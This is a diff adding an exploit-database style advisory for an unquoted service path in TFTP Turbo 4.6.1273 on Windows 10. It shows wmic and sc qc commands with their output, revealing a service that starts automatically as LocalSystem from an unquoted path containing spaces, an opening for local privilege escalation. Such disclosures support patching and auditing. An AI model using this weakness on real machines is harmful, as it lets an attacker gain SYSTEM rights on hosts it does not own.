@@ -1,0 +1,27 @@
+# Exploit Title: TFTP Turbo 4.6.1273 - 'TFTP Turbo 4' Unquoted Service Path
+# Exploit Author: boku
+# Date: 2020-02-10
+# Vendor Homepage: https://www.weird-solutions.com
+# Software Link: https://www.weird-solutions.com/download/products/tftptv4_retail_IA32.exe
+# Version: 4.6.1273
+# Tested On: Windows 10 (32-bit)
+
+C:\Users\nightelf>wmic service get name, pathname, startmode | findstr "TFTP" | findstr /i /v """
+TFTP Turbo 4       C:\Program Files\TFTP Turbo 4\tftpt.exe           Auto
+
+C:\Users\nightelf>sc qc "TFTP Turbo 4"
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: TFTP Turbo 4
+        TYPE               : 10  WIN32_OWN_PROCESS
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\Program Files\TFTP Turbo 4\tftpt.exe
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : TFTP Turbo 4
+        DEPENDENCIES       : Nsi
+                           : Afd
+                           : NetBT
+                           : Tcpip
+        SERVICE_START_NAME : LocalSystem
